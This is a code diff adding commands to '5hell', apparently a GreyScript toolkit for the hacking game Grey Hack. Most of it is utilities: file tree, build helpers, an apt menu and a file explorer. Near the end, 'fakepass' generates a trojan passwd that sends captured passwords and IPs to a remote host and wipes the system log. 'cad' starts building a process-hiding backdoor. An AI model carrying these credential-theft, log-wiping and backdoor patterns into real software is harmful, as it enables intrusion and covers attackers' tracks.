+	"Usage: tree -r [path|object] -- trees from path or object's '/' dir "+char(10)+
+	"-- returns output as a <b>list</b> of file objects"+char(10)+
+	"-- does not print filesystem output"+char(10)+
+	"-- does not enumerate output"
+	tem = null
+	use_new_tree = false
+	return_list = false
+	if arg1 == "-f" or arg1 == "-fr" or arg1 == "-rf" or arg1 == "-r" then 
+		use_new_tree = true 
+		// new tree stuff goes here
+		if arg1 == "fr" or arg1 == "-rf" or arg1 == "-r" then 
+			return_list = true
+			arg3 = "2"
+		end if
+		arg1 = arg2 
+		arg2 = arg3 
+		arg3 = arg4 
+	end if 
+	if arg1 then
+		if arg1 == "@clipa" or arg1 == "@a" then arg1 = globals.clip_board_alpha
+		if arg1 == "@clipb"  or arg1 == "@b" then arg1 = globals.clip_board_beta
+		if arg1 == "@clipc"  or arg1 == "@c" then arg1 = globals.clip_board_gamma
+		if typeof(arg1) == "string" then tem = globals.get_file(arg1)
+		if typeof(arg1) == "shell" or typeof(arg1) == "ftpshell" then tem = arg1.host_computer.File("/")
+		if typeof(arg1) == "computer" then tem = arg1.File("/")
+		if typeof(arg1) == "file" then tem = arg1
+	else
+		tem = localmachine.File("/")
+	end if
+	if not tem or not p_validate(tem,"size") then return "tree: invalid path or file"
+	if arg3 == "0" then arg3 = 0
+	if use_new_tree == true then return globals.newtree(tem,arg2)
+	globals.grepped_file = null
+	globals.list_files(tem, arg2, arg3, arg4)
+	if arg2 and globals.grepped_file and globals.grepped_file.name == arg2 then return globals.grepped_file
+	return 0
+end function
+command.makfit = function(arg1, arg2, arg3=0, arg4=0)
+	if not arg1 or not arg2 or arg1 == "help" or arg1 == "-h" then return "<u>File Compression || File Size || MAKFIT</u>"+char(10)+
+	"Make it fit file compression tool by Plu70"+char(10)+
+	"File sizes are (mostly) determined by name. This tool will"+char(10)+
+	"-- build files with different names until at or below the desired size."+char(10)+
+	"-- if the -n option is used, no input file is used"+char(10)+
+	"---- instead a dummy file is used and saved as the discovered name"+char(10)+char(10)+
+	"<b>Usage: makfit [/path.src] [target_size_in_bytes] [opt: -A --include uppercase]"+char(10)+
+	"-- target size in bytes determines ceiling for acceptable file size"+char(10)+
+	"---- min 120000, max unlimited however it is unlikely to see > 10MB"+char(10)+
+	"-- will change the file's name back to the name of the .src when done"+char(10)+
+	"-- builds to size and outputs to parent path of .src file."+char(10)+
+	"Extra: makfit [-n] [target_size_in_bytes] [opt:-A] -- do not use a source file "+char(10)+
+	"-- final filename may be used when compiling any script"+char(10)+
+	"-- this allows you to find a filename without supplying a source file."+char(10)+
+	"Note: when successful makfit will return the compressed file as an object."+char(10)+
+	"Usage Example:"+char(10)+
+	"|> poke my.src | scribus | makfit my.src 150000 | run"
+	no_source = false
+	source = "print(""Hellow World"")"
+	time_start = time
+	source_path = arg1
+	SIZE = arg2.to_int
+	if DEBUG then print("current path: "+ currentPath)
+	out_path = currentPath
+	out_file = null
+	source_file = null
+	temp_path = currentPath
+	if source_path.lower != "-n" then 
+		source_file = globals.get_file(source_path)
+		if not source_file then return "makfit: could not find file: "+source_path
+		if source_file.is_binary then return "makfit: expected text file, got binary."
+		temp_path = source_file.parent.path	
+		if source_file.has_permission("r") then source = source_file.get_content else return "makfit: cannot read source file. Permission denied."
+		if DEBUG then print("Read: "+source.len+" bytes from source file.")
+	end if
+	og_name = arg1
+	if typeof(source_file) == "file" then og_name = source_file.name
+	if og_name == "-n" then
+		no_source = true
+		og_name = "probe.src"
+		if currentPath != "/" then source_path = currentPath+"/"+og_name else source_path = og_name
+		print("makfit: running in sourceless mode"+char(10)+"Creating dummy file: probe.src")
+	 	command.poke(source_path)
+		print("Securing system.")
+		command.perms("lock","all")
+	end if
+	print(colorLightBlue+"Building "+CT+colorWhite+ og_name +CT+colorLightBlue+" to file size <= " +CT+colorWhite+ SIZE +CT+colorLightBlue+" bytes. "+CT)
+	og_name = og_name.split("\.")[0]
+	if DEBUG then print("og_name: "+og_name)
+	print("<align=center>"+char(3675)+"</align>")
+	last_size = (SIZE + 1000)
+	last_name = ""
+	new_name = function(int)
+		nm = []
+		r = range("a".code,"z".code)
+		if arg3 == "-A" then
+			R = range("A".code, "Z".code) // it is somehow faster (for me) with this commented out. ymmv
+			r = r + R											// i get about 45 sec avg with lowercase and 100 sec avg with upper+lower
+		end if
+		for loop in range(0, int)
+			r.shuffle
+			nm.push(char(r[0]))
+		end for
+		nm.push(".")
+		r.shuffle
+		nm.push(r[0])
+		nm = nm.join("")
+		return nm
+	end function
+	//
+	i = 0
+	l = 1
+	while last_size > SIZE
+		i = i + 1
+		if i >= 50 then
+			l = l + 1
+			i = 1
+		end if
+		n = new_name(l)
+		catch = localmachine.touch(temp_path, n+".src") // create the temp source file
+		if DEBUG then print("attempted to create "+temp_path+ " + "+ n +".src"+char(10)+"Result: "+catch)
+		if catch == "Can't compile. Source code is empty" then return catch
+		out_path = temp_path+n
+		if temp_path != "/" then out_path = temp_path+"/"+n
+		if DEBUG then print("out_path: "+out_path)
+		temp = globals.get_file(out_path+".src")
+		if not temp then return "makfit: error could not create tempfile"
+		temp.set_content(source)                      // set it's content with the original source
+		catch = shell.build(temp.path, temp_path)     // build it
+		if DEBUG then print("attempted to build "+temp.path+char(10)+"Result: "+catch)
+		//wait(1)
+		out_file = null
+		out_file = globals.get_file(out_path)
+		if not out_file then return("makfit: error: "+out_path+" not found. build failed."+CT)
+		last_size = out_file.size.to_int    // check it's size
+		if out_file.size.to_int > SIZE then
+			out_file.delete
+			temp.delete
+		end if
+    wait(.1)
+	end while
+	//
+	time_end = time
+	print(colorLightBlue+"Compiled "+colorWhite+out_file.name+colorLightBlue+" to size: "+colorWhite+out_file.size+colorLightBlue+" bytes."+CT)
+	print(colorLightBlue+"Process completed in "+colorOrange+ (time_end - time_start) +colorLightBlue+ " seconds."+CT)
+	if arg1 != "-n" then
+		print(colorLightBlue+out_file.path+" renamed to: ")
+		re_name = ""
+		if temp_path != "/" then temp_path = temp_path + "/"
+		command.mv(out_file.path,temp_path+og_name)
+		print("makfit: found filename:"+colorLightBlue+" "+out_file.name)
+	end if
+	print("makfit: compiled:<u>"+colorWhite+" "+out_file.path+" "+out_file.permissions+" </u></b></color>to<b> "+out_file.size+" bytes")
+	//command.perms("lock","all") removed because this is bad
+	print "makfit: remember to secure the new file(s)"+char(10)+"makfit: returning output file object..."
+	return out_file
+end function
+command.make = function(arg1, arg2, arg3=0, arg4=0)
+	if not arg1 or arg1 == "help" or arg1 == "-h" then return "</u>Make || Build</u>"+char(10)+"Usage: make [/path/file.src] [/destination/folder] [bool_importable: true/false | 1/0]"+char(10)+"-- build the .src file and ouput to destination folder."+char(10)+"-- final file name will be input file name with .src stripped."+char(10)+"-- e.g.<b> make /root/src/5hell.src /bin </b>"+char(10)+"-- build 5hell.src into a binary and output to:<b> /bin/5hell</b>"+char(10)+"-- n.b. make requires the source file to have the .src extension."+char(10)+"-- importable code can be imported by other sources when building."+char(10)+"-- this allows you to build programs with more than 160 characters by importing multiple source files."
+	pathSource = arg1
+	if typeof(arg1) == "file" then arg1 = arg1.path
+	if typeof(arg1) != "string" then return "make: invalid source path"
+	programPath = arg2
+	if typeof(programPath) == "file" then programPath = programPath.path 
+	importableCode = null
+	if not arg2 or typeof(arg2) != "string" then programPath = globals.currentPath
+  	if arg3 and (arg3 == "true" or arg3 == "1") then importableCode = 1 else importableCode = 0
+	fileSource = globals.get_file(pathSource)
+	folderDest = globals.get_file(programPath)
+	if not fileSource then return("build: can't find "+ pathSource)
+	if not folderDest then return("build: can't find " + folderDest)
+	output = shell.build(fileSource.path, folderDest.path, importableCode)
+	if output.len == 0 then
+		return("make: build successful")
+	else
+		return(output)
+	end if
+	return 0
+end function
+command.aptm = function(arg1, arg2, arg3=0, arg4=0) // requires aptclient.so
+	if arg1 == "-h" or arg1 == "help" then return "<u>Apt-Get Menu</u>"+char(10)+"Usage: aptm -- apt-get menu: "+char(10)+"-- manage apt functions"+char(10)+"-- add/remove/search repositories."+char(10)+"Usage: aptm [piped_aptclientLib] -- change scope of aptm to supplied lib"+char(10)+"-- eg: bios -a | cob set apt | exit"+char(10)+"-- when used on a remote 'silent launch' of 5hell"+char(10)+"---- pipes aptclientLib to the custom object then exits back to original 5hell"+char(10)+"-- cob get apt | aptm"+char(10)+"---- pipes aptclientLib to aptm and changes scope of aptm to remote"+char(10)+"Advanced: press [7] hot_swap_libs in aptm "+char(10)+"-- reloads meta/crypto/apt to use latest versions after updating"
+  	if not globals.apt_get then return colorRed+"Error:aptclient.so not found in /lib or current_path"+CT
+  	if GLASSPOOL then print(colorOrange+"Ignores Glasspool."+CT)
+	// apt menu by Plu70
+	if arg1 and typeof(arg1) == "aptclientLib" then
+		print "apt-get-menu: importing alternate aptclientLib"+char(10)+"-- pipe the old lib back to restore"+char(10)+"-- eg: liber -i /lib/aptclient.so | aptm"
+		globals.apt_get = arg1 
+	end if
+	apt = {}
+	apt.exit = function()
+		return 0
+	end function
+	apt.check_upgrade = function()
+    chk_upg = function(check)
+      if apt_get.check_upgrade(check) then
+        sp = check.split("/")
+        nm = sp.pop
+        if sp != [] then
+					print("__")
+          apt_get.install(nm, sp.join("/"))
+        else
+					print("__")
+          apt_get.install(nm)
+        end if
+        return "apt-get: "+check+" upgrade complete"
+      else
+        return "apt-get: "+check+" no upgrades found"
+      end if
+    end function
+	  cup = user_input("upgrade file_name or /path"+char(10)+":> ")
+    if not cup or cup == "" or cup == " " then return
+    f = get_shell.host_computer.File(cup)
+    if f and f.is_folder then
+      files = f.get_files
+			print("Checking: "+f.path+char(10)+"Found: "+files.len+" files.")
+      for sub in files
+        print(chk_upg(sub.path))
+      end for
+      return "Batch complete."
+    end if
+    return chk_upg(cup)
+	end function
+	apt.add_repo = function()
+	  return apt_get.add_repo(user_input("add repo ip:> "))
+	end function
+	apt.del_repo = function()
+		apt.update
+	  return apt_get.del_repo(user_input("del repo ip:> "))
+	end function
+	apt.install = function()
+	  return apt_get.install( user_input("install:> "), user_input("directory:> ") )
+	end function
+	apt.search = function()
+		apt.update
+	  return apt_get.search(user_input("search:> "))
+	end function
+	apt.show = function()
+		apt.update
+		print("_____________________________________________"+char(10))
+		rb = apt_get.show(user_input("show repo:> "))
+	  return char(10)+rb
+	end function
+	apt.hot_swap = function()
+		hot_swap_libs
+		return "Libraries hot_swapped."
+	end function
+	apt.update = function()
+	  return apt_get.update
+	end function
+	apting = true
+	while apting
+	  apt.update
+	  i = 0
+	  for c in apt.indexes
+		 print("["+colorWhite+i+CT+"] - apt-get."+"<b>"+c+"</b>")
+	    i = i + 1
+	  end for
+	  //print("["+colorWhite+i+CT+"] - Exit")
+		a_choice = user_input("(q=quit)||: ",0,1).to_int
+	  if a_choice == 0 or a_choice == "q" then return 0
+	  if typeof(a_choice) != "number" or a_choice >= i or a_choice < 0 then continue
+	  print(apt.indexes[a_choice])
+	  catch = apt[apt.indexes[a_choice]]
+	  print(catch)
+	  print("_____________________________________________")
+	  print
+	end while
+	return 0
+end function
+// felix file explorer by, Plu70
+if DEBUG then print("<size=75%>loading felix.5pk...(13.584kb)</size>")
+command.felix = function(arg1, arg2=0, arg3=0, arg4=0)
+  if arg1 == "help" or arg1 == "-h" then return "Usage: felix -- file explorer v 0.2, (wip). Use arrow keys to navigate. Press / to manually type a path."+char(10)+"Advanced: felix [shell|computer|file] -- run felix on filesys of piped object."+char(10)+"e.g. clipb @B 1 | felix -- where BUFFER[1] contained a file, shell or computer."
+  action = {}
+  action.cursor = 0
+  action.last = 0
+  min = 0
+  action.max = 0
+
+  action.memory = null
+  action.buffer = function(arg=null)
+    if arg then action.memory = arg
+    if not action.memory then return char(176)
+    return action.memory.name
+  end function
+  action.b = function(inf)
+    selected = action.get_selected(inf)
+    if not selected then return inf
+    globals.BUFFER.push(selected)
+    conf = user_input("felix:<b> sent "+selected.name+" to BUFFER. Acces via memory_alpha.</b>"+char(10)+"press <<b>anyKey</b>> to continue",0,1)
+    return inf
+  end function
+  action.get_selected = function(infile)
+    folders = infile.get_folders
+    files = infile.get_files
+    contents = folders + files
+    if contents.len == 0 then return 0
+    if contents.hasIndex(action.cursor) then return contents[action.cursor] else return 0
+  end function
+  action.r = function(inf) //  remove
+    selected = action.get_selected(inf)
+    if not selected then return inf
+    confirm = user_input("<b>delete</b> "+selected.path+"? [y/N] ||: ",0,1)
+    if confirm.lower == "y" or confirm == "RightArrow" then
+      check = selected.delete
+      if check then print(check) else print("...deleted.")
+    else
+      print("aborting...")
+    end if
+    return inf
+  end function
+  action.z = function(f)
+    if action.memory then action.memory = null
+    return f
+  end function
+  action.x = function(inf)
+    nf = action.get_selected(inf)
+    if nf then action.buffer(nf)
+    return inf
+  end function
+  action.v = function(inf)
+    selected = action.get_selected(inf)
+    if not selected then return inf
+    if not action.memory then return inf
+    dest = inf.path
+    label = ""
+    print("[0] abort "+char(10)+"[1] overwrite "+selected.name+char(10)+"[2] paste to "+inf.path)
+    if selected.is_folder then print("[3] paste to "+selected.path)
+    opt = user_input("(q=quit)||: ",0,1)
+    if opt == "0" or opt.lower == "q" then return inf
+    coop = user_input("[<b>0</b>] - Copy or [1] - Move (q=quit)||: ",0,1)
+    if coop.lower == "q" then return inf
+    if opt == "3" and selected.is_folder then
+      dest = selected.path
+      label = action.memory.name
+      if coop.to_int == 1 then
+        action.memory.move(dest, label)
+      else
+        action.memory.copy(dest, label)
+      end if
+      return inf
+    end if
+    if opt == "1" then
+      label = selected.name
+    else
+      if opt == "2" then
+        label = action.memory.name
+      else
+        return inf
+      end if
+    end if
+    if coop.to_int == 1 then
+      action.memory.move(dest, label)
+    else
+      action.memory.copy(dest, label)
+    end if
+    //action.memory = null
+    return inf
+  end function
+  action.e = function(f)
+    // poke, mkdir, rename
+    return f
+  end function
+  action.f = function(inf)
+    selected = action.get_selected(inf)
+    if not selected then return inf
+    print(command.file(selected))
+    print(colorGreen+"<u>==================================</u>"+CT)
+    wait_for = user_input("press <<b>anyKey</b>> to continue",0,1)
+    return inf
+  end function
+  action.n = function(inf)
+    selected = action.get_selected(inf)
+    if not selected then return inf
+    new_name = user_input("rename_"+selected.name+"(null=abort):> ")
+    if new_name == "" or new_name == " " then return inf
+    print(selected.rename(new_name))
+    return inf
+  end function
+  action.d = function(inf)
+    return action.RightArrow(inf)
+  end function
+  action.RightArrow = function(inf)
+    selected = action.get_selected(inf)
+    if not selected then return inf
+    if selected.is_folder then // descend into folder
+      inf = selected
+      action.last = abs(action.cursor)
+      action.cursor = 0
+      return inf
+    end if
+    if selected.is_binary then // run prompt
+      if selected.name.split("\.")[-1] != "so" then
+        doit = user_input("launch "+selected.name+"? [y/N] "+char(10)+"||: ",0,1).lower
+        if doit == "y" or doit == "RightArrow" then
+          if typeof(shell) == "ftpshell" then
+            print("launch not available in ftpshell")
+            return inf
+          end if
+		  globals.stack_pool("up")
+          try = shell.launch(selected.path, user_input("params for: "+char(10)+selected.path+" "))
+		  globals.stack_pool("down")
+          if try then print(try)
+        end if
+        return inf
+      else
+        if selected.path.split("/")[1] == "lib" then
+          if user_input("database this lib.so? [y/N] ||:",0,1).lower == "y" then
+            if globals.metaxploit then command.db("-l", selected.name)
+          end if
+          return inf
+        else
+          print(colorOrange+"Selected .so is not in /lib "+CT+char(10)+"aborting... ")
+          return inf
+        end if
+      end if
+    end if
+    if selected.has_permission("r") then
+      print(selected.get_content)
+      pause = user_input(char(10)+"press <<b>anyKey</b>> to continue",0,1)
+    end if
+    return inf
+  end function
+
+  action.a = function(f)
+    return action.LeftArrow(f)
+  end function
+  action.LeftArrow = function(f)
+    if f.name != "/" then
+      f = f.parent
+      action.cursor = abs(action.last)
+    end if
+    return f
+  end function
+
+  action.w = function(f)
+    return action.UpArrow(f)
+  end function
+  action.UpArrow = function(f)
+    if action.cursor <= min then
+      action.cursor = action.max
+      return f
+    end if
+    action.cursor = action.cursor - 1
+    return f
+  end function
+
+  action.s = function(f)
+    return action.DownArrow(f)
+  end function
+  action.DownArrow = function(f)
+    if action.cursor >= action.max then
+      action.cursor = min
+      return f
+    end if
+    action.cursor = action.cursor + 1
+    return f
+  end function
+
+  action.f1 = function(f)
+    print("-----")
+    print("Navigation: [w][a][s][d] or ArrowKeys ")
+    print("            [d] - rightArrow to: launch bin, open text, scan .so, descend dir")
+    print("Manual  cd: [/] - type path stating with / ")
+    print("               -- the [/] initiates manual entry ")
+    print("Select:     [x] - selection buffer; sets item to copy from ")
+    print("Paste:      [v] - performs a paste using selection buffer ")
+    print("               -- to highlighted selection (opens context menu) ")
+    print("Remove:     [r] - deletes file ")
+    print("Unselect:   [z] - remove item from selection buffer ")
+    print("Clr_scrn:   [c] - toggle clear screen or regular view ")
+    print("File info:  [f] - get file info/properties for highlighted selection ")
+    print("Buffit:     [b] - send highlighted selection to BUFFER ")
+    print("Rename:     [n] - rename highlighted selection ")
+
+    print("_____note: launching binaries via felix does NOT activate glasspool_____")
+    print("-----")
+    pause = user_input("press <<b>anyKey</b>> to continue",0,1)
+    return f
+  end function
+
+  action.get = function(arg, afile)
+    arg = arg.trim
+    if arg != "DownArrow" and arg != "UpArrow" and arg != "LeftArrow" and arg != "RightArrow" then arg = arg.lower
+    //print(arg)
+    if action.hasIndex(arg) then
+      a = @action[arg]
+      return a(afile)
+    else
+      return afile
+    end if
+  end function
+
+  action.branch = function(f, arg) // takes a file object
+    file_object = f
+    f_path = arg.split("/")
+    if f_path[0] == "" then f_path[0] = "/"
+    while file_object.name != "/"
+      file_object = file_object.parent
+    end while
+    print("f_path: "+f_path) // debug
+    print("arg: "+arg)       // debug
+    while file_object.path != arg.trim
+      globals.grepped_file = null
+      globals.list_files(file_object, f_path.pull, 1,"N") // requires 5hell or 5hell.so
+      if globals.grepped_file then file_object = globals.grepped_file else return f
+    end while
+    return file_object
+  end function
+
+  path_contents = function(f)
+    folders = f.get_folders
+    files = f.get_files
+    contents = folders + files
+    action.max = contents.len - 1
+    output = f.permissions+" "+f.owner+" "+f.group+" "+f.size+" "+char(1068)+"["+f.is_binary+"] "+f.path + char(10) + char(166) + " [ " + action.buffer + " ]"
+    i = 0
+    get = ""
+    c_put = ""
+    for c in contents
+      c_put = c.permissions+" "+c.owner+" "+c.group+" "+c.size+" "+char(1068)+"["+c.is_binary+"] "+c.name
+      output = output+char(10)+c_put
+      if i == action.cursor then
+        get = c.name
+        if get == null then get = ""
+      end if
+      i = i + 1
+    end for
+    if get then print( format_columns(output).replace(get,colorOrange+get+CT).replace(".src",colorCyan+".src"+CT).replace(".exe",colorRed+".exe"+CT).replace(".txt",colorWhite+".txt"+CT).replace(".log",colorLightBlue+".log"+CT).replace(".jpg",colorLightBlue+"</b>.jpg</color>").replace(".so",colorGold+"</b>.so</color>").replace(".html",colorCyan+".html"+CT) ) else print(format_columns(output))
+    return
+  end function
+
+  ////BEGIN MAINish
+  felix = function(file)
+    currentPath = file.path
+    contents = file.get_folders + file.get_files
+    action.max = contents.len - 1
+    CLEAR = -1
+    while true
+      if CLEAR > 0 then
+        clear_screen
+        button_c = "<b>C</b>"
+      else
+        button_c = "<b>c</b>"
+      end if
+      path_contents(file)
+      print(colorLightBlue+currentPath+CT)
+      print("[F1] help [w][a][s][d] == [^][<][v][>] [q] quit")
+      print("[z] clr slct [x] select [v] paste [f] file [n] rename ")
+      input = user_input("["+button_c+"] tog clrs [r] remove [b] buffit ||: ",0,1)
+      print
+      if input.lower == "c" then
+        CLEAR = (CLEAR * (-1)) //  flipbit
+        continue
+      end if
+      if input.lower == "q" then return "Goodbye."
+      if input == "/" then
+        input = input + user_input(input,0,0)
+        file = action.branch(file, input)
+        currentPath = file.path
+        continue
+      end if
+      file = action.get(input, file)
+      currentPath = file.path
+    end while
+    return 0
+  end function
+  /// END MAINish
+  init = function(file_object)
+    print(colorOrange+"Felix file explorer v 1.1 by Plu70"+CT)
+    print(colorLightBlue+"-----------------------------------------"+CT)
+    while file_object.name != "/"
+      file_object = file_object.parent
+    end while
+    return felix(file_object)
+  end function
+  if typeof(arg1) == "shell" then return init(arg1.host_computer.File("/"))
+  if typeof(arg1) == "computer" then return init(arg1.File("/"))
+  if typeof(arg1) == "file" then return init(arg1)
+  return init(localmachine.File("/"))
+end function
+
+command.file = function(arg1, arg2=0, arg3=0, arg4=0)
+	if not arg1 or arg1 == "help" or arg1 == "-h" then return colorGreen+"File || File Properties || Inspect File"+char(10)+
+	colorGreen+"<u>================================"+char(10)+
+	"Usage: <b>file [opt:-l|-c|-b|-r|-n|-p] [/path|file_object] [opt:shell|computer|file]</b>"+char(10)+
+		" File shows the properties information for the given file "+char(10)+
+		"and takes path or file_object and returns file information as a stirng."+char(10)+char(10)+
+		"Usage: file [opt] [/path] -- return information about the file at /path"+char(10)+
+		"UsagE: file [opt] [object] -- return onformation about the file object"+char(10)+
+		"Usage: file [opt] [/path] [object] -- return file info for file at path on object"+char(10)+
+		"-- computer and shell objects: relative paths use present working directory"+char(10)+
+		"-- file objects: must use absolute path"+char(10)+
+		"-- file objects: will be searched from  the <b>/</b> directory"+char(10)+
+		"Advanced: file [opt] [f_object] [object] -- will still return info of f_object; object is ignored"+char(10)+
+		"Usage: "+char(10)+
+		"-- file [<color=white>-l</color>] [path|object] [opt:object] -- return number of lines in the file as a string"+char(10)+
+		"-- file [<color=white>-c</color>] [path|object] [opt:object] -- return number of chars in the file as a string"+char(10)+
+		"-- file [<color=white>-s</color>] [path|object] [opt:object] -- return size of the file as a string"+char(10)+
+		"-- file [<color=white>-b</color>] [path|object] [opt:object] -- send file to BUFFER (and display file info)"+char(10)+
+		"---- also returns the file as an object"+char(10)+
+		"---- eg: "+colorLightBlue+"</b>grep <b>-f</b> *#.log$ /var | file -b"+char(10)+
+		"-- file [<color=white>-r</color>] [path|object] [opt:object] -- return the file as an object"+char(10)+
+		"-- file [<color=white>-n</color>] [path|object] [opt:object] -- return the name of file "+char(10)+
+		"-- file [<color=white>-p</color>] [path|object] [opt:object] -- return the path of file"+char(10)+
+		"- - - - - - - - - - - - - - - - - -"+char(10)+
+		"---- eg: <b></b>clipb @B [#] | file -p </b>-- return the path of the piped file object"+char(10)+
+		"---- eg: <b>file [opt] [path|file] [shell|computer]</b> -- run file on the remote object instead of locally"
+  	get_lines = false
+	get_chars = false
+  	to_buffer = false
+	return_name = false
+	return_path = false
+	return_file = false
+	return_size = false 
+
+	if arg1.indexOf("-") >= 0 then //== "-l" or arg1 == "-c" or arg1 == "-b" then
+		if arg1 == "-r" then return_file = true
+		if arg1 == "-l" then get_lines = true
+		if arg1 == "-c" then get_chars = true
+    	if arg1 == "-b" then 
+			to_buffer = true
+			return_file = true 
+		end if
+		if arg1 == "-n" then return_name = true
+		if arg1 == "-p" then return_path = true
+		if arg1 == "-s" then return_size = true
+		if arg2 then arg1 = arg2 else return "file: missing path or object: file [opt] [thing] [opt:thing]"
+		if arg3 then arg2 = arg3
+		if arg4 then arg3 = arg4
+	end if
+	if typeof(arg1) == "string" then
+		file = null
+		// backup og computer
+		comp_stor = globals.localmachine
+		// swap em if you got em
+		if arg2 and typeof(arg2) == "shell" then globals.localmachine = arg2.host_computer
+		if arg2 and typeof(arg2) == "computer" then globals.localmachine = arg2
+		// find our file somewhere
+		if arg2 and typeof(arg2) == "file" then
+			while arg2.name != "/"
+				arg2 = arg2.parent 
+			end while
+			file_list = globals.newtree(arg2,"2")
+			if file_list then
+				for f in file_list
+					if f.path == arg1 then file == f 
+				end for
+			end if			
+		else
+			file = globals.get_file(arg1)
+		end if
+		// restore og computer
+		globals.localmachine = comp_stor
+		// complain if needed
+		if not file or typeof(file) != "file" then return "file: "+arg1+" not found."
+		arg1 = file
+	end if
+	if typeof(arg1) == "file" then
+		if return_path then return arg1.path
+		if return_name then return arg1.name
+    	imp_stat = null
+		if DEBUG then print "checking for symlink"
+		sym_stat = null 
+		if NIGHTLY == true then sym_stat = arg1.is_symlink
+		if sym_stat then 
+			sym_stat = "yes" 
+			imp_stat = "symlink"
+		else 
+			sym_stat = "no"
+		end if
+		if DEBUG then print "checking import status: skipping symlinks"
+		imp_stat = arg1.allow_import
+		if imp_stat != "symlink" then 
+			if imp_stat then imp_stat = "yes" else imp_stat = "no"
+		end if
+		if DEBUG then print "status: "+imp_stat
+  		file_id_info = ["name: "+arg1.name, "path: "+arg1.path, "size: "+arg1.size, "owner: "+arg1.owner, "group: "+arg1.group, "perms: "+arg1.permissions] 
+		if arg1.is_folder then
+			if DEBUG then print "debug: is_folder"
+			file_id_info.push("type: folder")
+			conts = arg1.get_folders.len + arg1.get_files.len
+			if DEBUG then print "subs: "+conts
+			file_id_info.push("subs: "+conts)
+		else
+			if arg1.is_binary then
+				if DEBUG then print "debug: is_binary"
+				file_id_info.push("type: binary")
+				file_id_info.push("import: "+imp_stat)
+			else
+				if DEBUG then print "debug: is_text"
+				file_id_info.push("type: ascii")
+				lines = 0
+				chars = 0
+				if arg1.get_content then
+					lines = arg1.get_content.split(char(10)).len
+					chars = arg1.get_content.values.len
+				end if
+				file_id_info.push("lines: "+str(lines))
+				file_id_info.push("chars: "+str(chars))
+			end if
+		end if
+		file_id_info.push("symlnk: "+sym_stat)
+		if return_size == true then 
+			//print "file: returning file size..."
+			return arg1.size
+		end if
+		if to_buffer then
+			globals.BUFFER.push(arg1)
+			print "file: <b>"+arg1.name+"</b> sent to <b><color=orange>BUFFER</b>"
+			return format_columns(file_id_info.join(char(10)))
+		end if
+		if return_file then 
+			print "file: returning object for: "+arg1.path
+			return arg1
+		end if
+		if get_lines then
+			if file_id_info.indexOf("type: binary") == null then return str(lines) else return "file: "+arg1.path+" is binary"
+		end if
+		if get_chars then
+			if file_id_info.indexOf("type: binary") == null then return str(chars) else return "file: "+arg1.path+" is binary"
+		end if
+    	print(colorGreen+"<u>==================================</u>"+CT)
+		return format_columns(file_id_info.join(char(10)))
+	end if
+	return "file: unknown error"
+end function
+command.fakepass = function(arg1=0, arg2=0, arg3=0, arg4=0)
+    if arg1 == "help" or arg1 == "-h" then return "Usage: fakepass [opt:ip] [opt:pass] -- create passwd.src in current_path. Check src and build to /bin/passwd. PW capture malware."
+    ip = arg1
+    p = arg2
+    if not ip then ip = """"+user_input("remote ip:> ",0,0)+"""" else ip = """"+ip+""""
+    if ip == """"+""+"""" then return "aborting..."
+    if not p then p = """"+user_input("remote pass:> ",1,0)+"""" else p = """"+p+""""
+    if p == """"+""+"""" then return "aborting..."
+    passwd = "if params.len != 1 then exit(""<b>Usage: passwd [username]</b>""+char(10)+""Example: passwd john"");print(""Changing password for user ""+params[0]+""."");pass = user_input(""New password:"", 1);catch = get_shell.host_computer.change_password(params[0], pass);if catch != 1 then;if catch then exit(catch);exit(""Error: password not modified"");end if;"
+    rem_c = "localmachine=get_shell.host_computer;ip = "+ip+";pt = 22;user = ""root"";p="+p+";remote = get_shell.connect_service(ip, pt, user, p);if remote then;remote.host_computer.touch(""/root/rkit"",""rpm"");rpm=remote.host_computer.File(""/root/rkit/rpm"");if rpm then rpm.set_content(rpm.get_content+char(10)+pass+char(10)+localmachine.public_ip+char(10)+localmachine.local_ip);end if;"
+    scrub = "syslog = localmachine.File(""/var/system.log"");if syslog then;localmachine.touch(""/var"",""system.bak"");sbk=localmachine.File(""/var/system.bak"");if sbk then;sbk.set_content(""No IPs Today :D"");syslog.delete;sbk.move(""/var"", ""system.log"");end if;end if;"
+    final = "if catch == 1 then exit(""password modified OK"");if catch then exit(catch);print(""Error: password not modified"")"
+    fp = passwd + rem_c + scrub + final
+    localmachine.touch(currentPath, "passwd.src")
+    source = globals.get_file("passwd.src")
+    print("FakePass v 0.2, by Plu70")
+    print(colorRed+"- - - - - - - - - - - - - - - - - - - - -"+CT)
+    if not source then return "write error: unable to create passwd.src in "+currentPath
+    source.set_content(fp)
+    wait(1)
+    print(source.get_content)
+    print
+    saved = "password.src"
+    if currentPath != "/" then saved = "/password.src"
+    print(colorLightBlue+"Saved to: "+colorWhite+currentPath+saved+CT)
+    print(colorRed+"- - - - - - - - - - - - - - - - - - - - -"+CT+char(10))
+    return 0
+end function
+command.cad = function(arg1=0, arg2=0, arg3=0, arg4=0)
+    if arg1 == "help" or arg1 == "-h" then return "cad: cloak and dagger protocol."+char(10)+"Usage: cad [optional: ip ] -- or enter rshell-server ip at prompt"+char(10)+"Creates ps.src in current path. "+char(10)+"Review ps.src and build with make or makfit into /bin"+char(10)+"Remove .src, run /bin/ps once with metaxploit.so present then remove metaxploit.so"+char(10)+"The result is a hidden backdoor on the target. Use with care."
+    ps = """"+"ps"+""""
+    shell = """"+"5hell"+""""
+    zp = """"+"0.0%"+""""
+    z2 = """"+"0.3%"+""""
+    z1 = """"+"0.4%"+""""
+    zf = [zp,z1,z2]
+    zf.shuffle
+    m_path = """"+"/lib/metaxploit.so"+""""
+    m = """"+"metaxploit.so"+""""
+    add = arg1
+    if not add then add = """"+user_input("rshell addr:> ")+"""" else add = """"+add+""""
+    if add == """"+""+"""" then return "aborting..."
+    rip="ps=function();zp="+zp+";z2="+z2+";z1="+z1+";zf=[zp,z1,z2];zf.shuffle;procs = get_shell.host_computer.show_procs;k_tar = "+ps+";k_tar1 = "+shell+";processes = [];processes = procs.split(char(10));for p in processes;process = p.split(char(32));process_CMD = process[4];process_MEM = process[3];process_CPU = process[2];process_ID = process[1];process_user = process[0];if process_CMD == k_tar or process_CMD == k_tar1 then;continue;else;print(format_columns(process_user + char(32) + process_ID + char(32) + process_CPU + char(32) + process_MEM + char(32) + process_CMD));end if;end for;rng = range(1120, 9982);rng.shuffle;return(format_columns(active_user+char(32)+rng.pop+char(32)+"+zp+"+char(32)+zf.pop+char(32)+"+ps+"));end function"
+    // nop
